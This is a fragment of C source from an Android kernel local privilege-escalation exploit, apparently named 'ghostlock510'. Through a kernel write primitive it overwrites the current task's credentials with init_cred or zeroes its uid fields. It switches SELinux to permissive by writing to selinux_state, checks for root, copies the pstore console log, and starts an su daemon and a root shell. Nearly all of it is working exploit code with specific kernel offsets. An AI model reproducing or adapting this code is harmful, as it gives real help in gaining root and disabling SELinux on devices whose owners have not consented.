    /* Amazon root trick (#41): overwrite task->real_cred and task->cred
     * with init_cred (uid 0).  R7 DWARF real offsets (NOT the Amazon
     * 0x6e0/0x6e8 — version skew): real_cred=task+0x778, cred=task+0x780.
     * pc = k_init_cred via --cred-swap; pc low bits 0 -> black, fine. */
    static const unsigned cred_off[] = {0x780};
    cred_pc_now = 1;
    for (unsigned i = 0; i < 1; i++) {
      if (!write_value(k_current_task + cred_off[i], 0)) {
        fprintf(stderr, "[-] cred-swap write trigger failed\n");
        return 6;
      }
      record_stage((char)('7' + i));
    }
    cred_pc_now = 0;
    /* The init_cred VA's low byte (0x60) lands on enforcing as nonzero
     * (bool) — put SELinux back to permissive with one final perm-pc
     * write over selinux_state. */
    cred_swap = 0; perm_pc = 1;
    if (!write_value(k_selinux_state, 0)) {
      fprintf(stderr, "[-] cred-swap perm restore write failed\n");
      return 6;
    }
    record_stage('8');
  } else {
  static const unsigned id_offsets[] = {0x4, 0x14, 0x20};
  for (unsigned i = 0; i < sizeof(id_offsets) / sizeof(id_offsets[0]); i++) {
    if (!write_value(k_current_cred + id_offsets[i], 0)) {
      fprintf(stderr, "[-] cred id write trigger failed\n");
      return 6;
    }
    record_stage((char)('7' + i));
  }
  }
  usleep(100000);
  printf("[*] uid=%u euid=%u gid=%u egid=%u enforce=%d\n",
         getuid(), geteuid(), getgid(), getegid(), read_enforce());
  if (getuid() != 0 || geteuid() != 0 || read_enforce() != 0) {
    fprintf(stderr, "[-] root/permissive verification failed (halt, stage K)\n");
    record_stage('K');
    for (;;) pause();
  }

  record_stage('A');
  /* Root + permissive: snapshot the PREVIOUS boot's panic console before
   * anything else overwrites ramoops.  deflate-compressed; gunzip on host.
   * Failure here must never abort the exploit. */
  {
    int src = open("/sys/fs/pstore/console-ramoops-0", O_RDONLY | O_CLOEXEC);
    if (src < 0) {
      fprintf(stderr, "[-] pstore open failed: %s\n", strerror(errno));
    } else {
      int dst = open("/data/local/tmp/console-ramoops-0.gz",
                     O_WRONLY | O_CREAT | O_TRUNC | O_DSYNC, 0600);
      char buf[65536];
      ssize_t n, total = 0;
      while ((n = read(src, buf, sizeof(buf))) > 0) {
        ssize_t off = 0;
        while (off < n) {
          ssize_t w = write(dst, buf + off, (size_t)(n - off));
          if (w <= 0) break;
          off += w;
        }
        total += n;
      }
      printf("[*] pstore console copied: %zd bytes\n", total);
      close(dst);
      close(src);
    }
  }
  ignore_terminal_signals();
  printf("[+] ROOT + permissive verified; entering direct shell\n");
  if (install_su) {
    pid_t d = fork();
    if (d == 0) { execl("/data/local/tmp/ghostlock510", "ghostlock510", "--su-daemon", (char *)NULL); _exit(30); }
    if (d > 0) usleep(300000);
  }
  pid_t shell = fork();
  if (shell < 0) {
    fprintf(stderr, "[-] shell fork failed: %s\n", strerror(errno));
    for (;;) pause();
  }
  if (shell == 0) {
    struct sigaction defaults;
    memset(&defaults, 0, sizeof(defaults));
    defaults.sa_handler = SIG_DFL;
    sigemptyset(&defaults.sa_mask);
    (void)sigaction(SIGHUP, &defaults, NULL);
    (void)sigaction(SIGINT, &defaults, NULL);
    (void)sigaction(SIGQUIT, &defaults, NULL);
    execl("/data/local/tmp/ghostlock510", "ghostlock510", "--post-root",
          (char *)NULL);
    _exit(30);
  }
  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);
  for (;;) pause();
}
